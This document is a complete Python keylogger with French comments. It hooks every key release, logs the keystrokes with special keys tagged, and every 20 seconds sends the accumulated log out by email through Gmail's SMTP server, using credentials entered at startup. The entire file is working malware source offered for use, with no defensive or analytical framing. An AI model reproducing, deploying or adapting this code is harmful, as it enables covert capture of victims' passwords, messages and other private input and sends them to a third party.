import keyboard # pour enregister les touches de clavier
import smtplib, ssl # pour envoyer email via un serveur stmp

from threading import Timer # pour timer les envois de mail
from datetime import datetime

# le keylogger est recupere par mail :
PORT = 465
SMTP_SERVER = "smtp.gmail.com"
EMAIL_ADDRESS = input("Type your email and press enter: ")
EMAIL_PASSWORD = input("Type your password and press enter: ")

SEND_REPORT_EVERY = 20 #  intervalle entre 2 mails (en secondes)

class Keylogger:
    def __init__(self, interval, report_method="email"):

        self.interval = interval #correspond à SEND_REPORT_EVERY

        self.log = "" # string enregistre pendant la periode interval

    def touche_frappe(self, event):
        #Methode appellee quand une touche de clavier est utilisee
        s = event.name
        if len(s) > 1:
            # cas où s n'est pas un caractere mais une touche speciale (ctrl, alt, ...)
            if s == "space":
                s = " " 
            elif s == "enter":
                s = "[ENTER]\n" #on ajoute une nouvelle ligne
            elif s == "decimal":
                s = "."
            else:
                s = s.replace(" ", "_") #on remplace les espaces par des underscores
                s = f"[{s.upper()}]"
        self.log += s

    def sendmail(self, message):
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(SMTP_SERVER, PORT, context=context) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message) # l'adresse mail s'envoit un mail à elle même
            server.quit()

    def report(self):
        #fonction appellee tout les self.interval pour envoyer le mail et reset self.log
        if self.log: 
            #le log n'est pas vide
            self.sendmail(self.log)

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True 
        timer.start() # debut du timer
    
    def start(self):
        keyboard.on_release(callback=self.touche_frappe) # debut du keylogger
        self.report() #on repport les touches
        keyboard.wait()

keylogger = Keylogger(interval=SEND_REPORT_EVERY)
keylogger.start()